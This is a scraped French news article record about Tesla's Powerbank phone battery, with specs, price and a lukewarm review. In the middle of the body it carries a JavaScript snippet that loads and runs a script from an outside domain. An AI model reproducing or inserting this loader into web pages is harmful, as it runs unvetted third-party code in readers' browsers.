{"title": "Tesla lance la batterie Powerbank, un << superchargeur >> pour smartphone", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-11-21", "content": "Apres les voitures et les camions electriques, Tesla s'attaque aux smartphones. La firme d'Elon Musk a en effet commercialise une batterie externe appelee Powerbank pour recharger les telephones mobiles. Celle-ci utilise une cellule 18650, la meme que celles equipant les batteries des Model S et X du constructeur. Au coeur de tous les produits  Tesla , se trouvent des  batteries lithium-ion , que la marque produit dans son  usine geante Gigafactory , situee dans le  desert  du Nevada (Etats-Unis). Elles sont utilisees dans les Tesla Model S, Model X,  Model 3 , dans le futur camion electrique  Tesla Semi  ainsi que dans les batteries murales  Powerpack et Powerwall . Tesla va exploiter encore un peu plus ce  filon  : la societe vient de se lancer sur le marche des batteries externes pour  smartphones . Ces accessoires permettent de recharger son mobile, ou tout autre appareil nomade a batterie, lorsque l'utilisateur n'a pas acces a une prise secteur.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La Tesla Powerbank, une batterie externe avant tout esthetique  Baptisee Powerbank, la batterie externe Tesla est presentee comme un << superchargeur >> equipe d'une cellule lithium-ion 18650, que l'on retrouve notamment dans les  voitures  de la marque. Elle offre une capacite de 3.350 mAh avec une tension en sortie de 5 V et 1,5 A maximum. Suffisant pour une charge normale mais pas rapide, ce qui est assez decevant. Au final, le principal attrait de ce produit est son design inspire de celui des Tesla, qui ravira sans doute les fans de la marque. Mais ses performances n'ont rien de remarquable. La  Tesla Powerbank  est munie de connecteurs  USB , micro USB et Lightning (Apple). Elle est vendue 45 dollars (38 euros au cours actuel) et se trouve deja en rupture de stock. En France, il est possible de trouver de nombreuses alternatives de  batteries externes , certes moins esthetiques, mais plus performantes et abordables. Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  tesla batterie  |  facebook pour smartphone  |  tesla  |  def smartphone  |  smartphone hp  |  moteur tesla  |  bobine tesla  |  tesla coil  |  ionosphere tesla  |  machine de tesla", "theme": "tech"}